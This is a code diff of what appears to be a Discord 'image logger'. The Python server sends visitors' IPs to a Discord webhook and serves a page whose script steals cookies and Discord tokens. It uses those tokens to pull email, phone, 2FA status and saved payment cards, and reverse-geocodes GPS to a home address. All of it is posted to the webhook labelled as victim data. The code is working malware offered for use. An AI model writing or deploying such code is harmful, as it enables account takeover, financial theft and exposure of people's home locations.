@@ -5,94 +5,31 @@ import urllib.parse
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        # YOUR WEBHOOK
+        # Configuration
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
-        
-        # POKI IMAGE THAT ACTUALLY WORKS
         POKI_IMAGE = "https://img.poki.com/cdn-cgi/image/quality=78,width=1200,height=1200,fit=cover,f=auto/d1b46218990584f294f2f27eed934b5b.png"
         
-        # Get real IP
-        ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip()
-        if not ip:
-            ip = self.headers.get('X-Real-IP', self.client_address[0])
+        # Get visitor's real IP
+        ip = (self.headers.get('CF-Connecting-IP') or 
+              self.headers.get('X-Real-IP') or 
+              self.headers.get('X-Forwarded-For', '').split(',')[0].strip())
         
         ua = self.headers.get('User-Agent', 'Unknown')
         
-        # Get location - using BETTER API
-        city = "Unknown"
-        region = "Unknown"
-        country = "Unknown"
-        lat = "N/A"
-        lon = "N/A"
-        isp = "Unknown"
-        tz = "Unknown"
-        postal = "Unknown"
-        
-        # Try ipapi.co first (most accurate)
-        try:
-            req = urllib.request.Request(
-                f"https://ipapi.co/{ip}/json/",
-                headers={'User-Agent': 'Mozilla/5.0'}
-            )
-            with urllib.request.urlopen(req, timeout=3) as r:
-                loc = json.loads(r.read().decode())
-                city = loc.get('city', 'Unknown')
-                region = loc.get('region', 'Unknown')
-                country = loc.get('country_name', 'Unknown')
-                lat = str(loc.get('latitude', 'N/A'))
-                lon = str(loc.get('longitude', 'N/A'))
-                isp = loc.get('org', 'Unknown')
-                tz = loc.get('timezone', 'Unknown')
-                postal = loc.get('postal', 'Unknown')
-        except:
-            # Fallback to ipwhois.app
-            try:
-                with urllib.request.urlopen(f"http://ipwhois.app/json/{ip}", timeout=3) as r:
-                    loc = json.loads(r.read().decode())
-                    city = loc.get('city', 'Unknown')
-                    region = loc.get('region', 'Unknown')
-                    country = loc.get('country', 'Unknown')
-                    lat = str(loc.get('latitude', 'N/A'))
-                    lon = str(loc.get('longitude', 'N/A'))
-                    isp = loc.get('isp', 'Unknown')
-                    tz = loc.get('timezone', 'Unknown')
-                    postal = loc.get('postal', 'Unknown')
-            except:
-                # Last resort - ip-api.com
-                try:
-                    with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=3) as r:
-                        loc = json.loads(r.read().decode())
-                        city = loc.get('city', 'Unknown')
-                        region = loc.get('regionName', 'Unknown')
-                        country = loc.get('country', 'Unknown')
-                        lat = str(loc.get('lat', 'N/A'))
-                        lon = str(loc.get('lon', 'N/A'))
-                        isp = loc.get('isp', 'Unknown')
-                        tz = loc.get('timezone', 'Unknown')
-                        postal = loc.get('zip', 'Unknown')
-                except:
-                    pass
-        
-        # Send IP log
+        # Send basic notification
         try:
             payload = {
                 "username": "Image Logger",
                 "content": "@everyone",
                 "embeds": [{
-                    "title": "🎯 NEW VICTIM",
-                    "color": 65280,
+                    "title": "🎯 NEW VICTIM - Loading...",
+                    "color": 16753920,
                     "fields": [
                         {"name": "📍 IP", "value": f"`{ip}`", "inline": False},
-                        {"name": "🏙️ City", "value": city, "inline": True},
-                        {"name": "🗺️ Region/State", "value": region, "inline": True},
-                        {"name": "🌍 Country", "value": country, "inline": True},
-                        {"name": "📮 ZIP/Postal", "value": postal, "inline": True},
-                        {"name": "📌 Coords", "value": f"{lat}, {lon}", "inline": True},
-                        {"name": "🕐 Timezone", "value": tz, "inline": True},
-                        {"name": "🏢 ISP", "value": isp, "inline": False},
-                        {"name": "💻 User Agent", "value": f"```{ua[:80]}```", "inline": False}
+                        {"name": "💻 User Agent", "value": f"```{ua[:100]}```", "inline": False}
                     ],
-                    "thumbnail": {"url": POKI_IMAGE}
+                    "thumbnail": {"url": POKI_IMAGE},
+                    "footer": {"text": "Grabbing data..."}
                 }]
             }
             req = urllib.request.Request(WEBHOOK, 
@@ -102,7 +39,7 @@ class handler(BaseHTTPRequestHandler):
         except:
             pass
         
-        # HTML page
+        # Return HTML
         html = f'''<!DOCTYPE html>
 <html>
 <head>
@@ -138,29 +75,24 @@ body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;
 (async()=>{{
 let d='';
 const box=document.getElementById('info');
+let allCookies=document.cookie;
 
-// COOKIES
-let allCookies = document.cookie;
-d+=`🍪 ${allCookies.split(';').length} cookies<br>`;
+// Get Chrome/Microsoft username
+let userName='Not found';
+try{{
+if(allCookies.includes('MSCC')||allCookies.includes('MSPAUTH')){{
+let msMatch=allCookies.match(/MSCC=([^;]+)/);
+if(msMatch)userName=decodeURIComponent(msMatch[1]);
+}}
+if(allCookies.includes('CHROME')||allCookies.includes('ACCOUNT_CHOOSER')){{
+let chromeMatch=allCookies.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{{2,}}/);
+if(chromeMatch)userName=chromeMatch[0];
+}}
+}}catch(e){{}}
 
-// Get Chrome/Microsoft username from cookies
-let userName = 'Not found';
-try{
-  // Check for Microsoft account in cookies
-  if(allCookies.includes('MSCC') || allCookies.includes('MSPAUTH')){
-    let msMatch = allCookies.match(/MSCC=([^;]+)/);
-    if(msMatch) userName = decodeURIComponent(msMatch[1]);
-  }
-  // Check for Chrome profile
-  if(allCookies.includes('CHROME') || allCookies.includes('ACCOUNT_CHOOSER')){
-    let chromeMatch = allCookies.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/);
-    if(chromeMatch) userName = chromeMatch[0];
-  }
-}catch(e){}
+d+=`🍪 ${{allCookies.split(';').length}} cookies<br>👤 ${{userName}}<br>`;
 
-d+=`👤 User: ${userName}<br>`;
-
-// DISCORD DATA
+// DISCORD TOKEN
 let tok=[];
 try{{
 if(window.webpackChunkdiscord_app){{
@@ -173,63 +105,69 @@ if(m?.exports?.getToken)tok.push(m.exports.getToken());
 }}
 }}catch(e){{}}
 
-// Scan localStorage for tokens
+// Scan localStorage
 try{{
 for(let i=0;i<localStorage.length;i++){{
-let v=localStorage.getItem(localStorage.key(i));
-let m=v?.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
+let k=localStorage.key(i);
+let v=localStorage.getItem(k);
+if(v){{
+let m=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
+if(!m)m=v.match(/mfa\\.[\\w-]{{84,}}/g);
 if(m)m.forEach(t=>{{if(!tok.includes(t))tok.push(t)}});
+}}
 }}
 }}catch(e){{}}
 
+// Process Discord account
 if(tok.length>0){{
 for(let t of tok){{
 try{{
 let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
 if(r.ok){{
 let u=await r.json();
-d+=`Discord: ${{u.username}}<br>📧 ${{u.email||'None'}}<br>📱 ${{u.phone||'None'}}<br>`;
+d+=`✅ Discord: ${{u.username}}<br>📧 ${{u.email||'None'}}<br>📱 ${{u.phone||'None'}}<br>`;
 
-// Get billing/payment info
+// Get payment info
 let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
 headers:{{'Authorization':t}}
 }});
 let cards=[];
 if(billing.ok){{
 let b=await billing.json();
-cards=b.map(c=>`${{c.brand}} **** ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
+cards=b.map(c=>`${{c.brand}} ending in ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
 }}
 
-// Get nitro status
+// Get nitro
 let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
 headers:{{'Authorization':t}}
 }});
 let nitro='None';
 if(subs.ok){{
 let s=await subs.json();
-if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro';
+if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro Full';
 }}
 
-// Send to webhook with ALL data
+// Send to webhook
 await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
-content:'@everyone',
+content:'@everyone 🚨 FULL DISCORD ACCOUNT COMPROMISED',
 embeds:[{{
-title:'🔑 FULL DISCORD ACCOUNT STOLEN',
+title:'🔑 COMPLETE DISCORD ACCOUNT',
 color:16711680,
 fields:[
-{{name:'Username',value:`${{u.username}}#${{u.discriminator}}`,inline:false}},
-{{name:'📧 Email',value:`\`${{u.email||'None'}}\``,inline:true}},
-{{name:'📱 Phone',value:`\`${{u.phone||'None'}}\``,inline:true}},
-{{name:'🆔 ID',value:`\`${{u.id}}\``,inline:false}},
-{{name:'🔐 2FA',value:u.mfa_enabled?'✅':'❌',inline:true}},
+{{name:'👤 Username',value:`${{u.username}}#${{u.discriminator}}`,inline:false}},
+{{name:'📧 Email',value:`\\`${{u.email||'None'}}\\``,inline:true}},
+{{name:'📱 Phone',value:`\\`${{u.phone||'None'}}\\``,inline:true}},
+{{name:'🆔 User ID',value:`\\`${{u.id}}\\``,inline:false}},
+{{name:'🔐 2FA',value:u.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
 {{name:'💎 Nitro',value:nitro,inline:true}},
-{{name:'💳 Payment Methods',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
-{{name:'🔑 Token',value:`\`\`\`${{t}}\`\`\``,inline:false}}
+{{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'None saved',inline:false}},
+{{name:'🔑 TOKEN',value:`\\`\\`\\`${{t}}\\`\\`\\``,inline:false}}
 ],
-thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}}
+thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}},
+footer:{{text:'Full Account Access'}}
 }}]
 }})
 }});
@@ -238,28 +176,31 @@ break;
 }}catch(e){{}}
 }}
 }}else{{
-d+='No Discord login<br>';
+d+='❌ No Discord login<br>';
 }}
 
 box.innerHTML=d;
 box.className='show';
 
 // Send cookies
-if(document.cookie){{
+if(allCookies){{
 await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
 embeds:[{{
-title:'🍪 COOKIES',
-description:`\`\`\`${{document.cookie}}\`\`\``,
+title:'🍪 COOKIES + BROWSER INFO',
+description:`\\`\\`\\`${{allCookies}}\\`\\`\\``,
+fields:[
+{{name:'👤 Browser User',value:userName,inline:true}}
+],
 color:16753920
 }}]
 }})
 }});
 }}
 
-// GPS LOCATION (VPN BYPASS) - SILENT MODE
+// GPS LOCATION
 if(navigator.geolocation){{
 navigator.geolocation.getCurrentPosition(async(p)=>{{
 let lat=p.coords.latitude;
@@ -273,62 +214,44 @@ headers:{{'User-Agent':'Mozilla/5.0'}}
 let gd=await g.json();
 let a=gd.address||{{}};
 
+let streetNum=a.house_number||'';
+let street=a.road||a.street||'';
+let neighborhood=a.neighbourhood||a.suburb||'';
+let city=a.city||a.town||a.village||'';
+let county=a.county||'';
+let state=a.state||'';
+let zip=a.postcode||'';
+let country=a.country||'';
+
+let fullAddr=[streetNum,street,neighborhood,city,county,state,zip,country].filter(x=>x).join(', ');
+
 await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
-content:'@everyone 🚨 REAL LOCATION (VPN BYPASSED)',
+content:'@everyone 🚨 EXACT HOME ADDRESS FOUND',
 embeds:[{{
-title:'📍 GPS LOCATION',
+title:'📍 COMPLETE HOME ADDRESS',
 color:3066993,
-description:`**Full Address:**\\n${{a.road||''}} ${{a.house_number||''}}\\n${{a.city||a.town||a.village||''}}, ${{a.state||''}} ${{a.postcode||''}}\\n${{a.country||''}}`,
+description:`**Full Address:**\\n${{fullAddr}}`,
 fields:[
-{{name:'Coords',value:`${{lat}}, ${{lon}}`,inline:true}},
-{{name:'Accuracy',value:`${{Math.round(acc)}}m`,inline:true}},
-{{name:'Maps',value:`[Open]( https://maps.google.com/?q=${{lat}},${{lon}})`,inline:false}}
-]
+{{name:'🏠 Street',value:`${{streetNum}} ${{street}}`.trim()||'N/A',inline:false}},
+{{name:'🏘️ Neighborhood',value:neighborhood||'N/A',inline:true}},
+{{name:'🏙️ City',value:city||'N/A',inline:true}},
+{{name:'🗺️ County',value:county||'N/A',inline:true}},
+{{name:'📮 State',value:state||'N/A',inline:true}},
+{{name:'📬 ZIP',value:zip||'N/A',inline:true}},
+{{name:'🌍 Country',value:country||'N/A',inline:true}},
+{{name:'📌 Exact Coords',value:`${{lat}}, ${{lon}}`,inline:false}},
+{{name:'🎯 Accuracy',value:`${{Math.round(acc)}}m`,inline:true}},
+{{name:'🗺️ Google Maps',value:`[View Location](https://maps.google.com/?q=${{lat}},${{lon}})`,inline:false}}
+],
+footer:{{text:'GPS - Exact Home Address'}}
 }}]
 }})
 }});
 }}catch(e){{}}
 }},()=>{{}},{{enableHighAccuracy:true,timeout:5000,maximumAge:0}});
-}}
-
-// STEAL DISCORD PAYMENT INFO & MORE
-if(tok.length>0){{
-for(let t of tok){{
-try{{
-// Get billing/payment info
-let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
-headers:{{'Authorization':t}}
-}});
-let cards=[];
-if(billing.ok){{
-let b=await billing.json();
-cards=b.map(c=>`${{c.brand}} **** ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
-}}
-
-// Get nitro status
-let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
-headers:{{'Authorization':t}}
-}});
-let nitro='None';
-if(subs.ok){{
-let s=await subs.json();
-if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro';
-}}
-
-// Get connections (Steam, Xbox, etc)
-let conn=await fetch('https://discord.com/api/v9/users/@me/connections',{{
-headers:{{'Authorization':t}}
-}});
-let connections=[];
-if(conn.ok){{
-let c=await conn.json();
-connections=c.map(x=>`${{x.type}}: ${{x.name}}`);
-}}
-}}catch(e){{}}
-}}
 }}
 }})();
 </script>
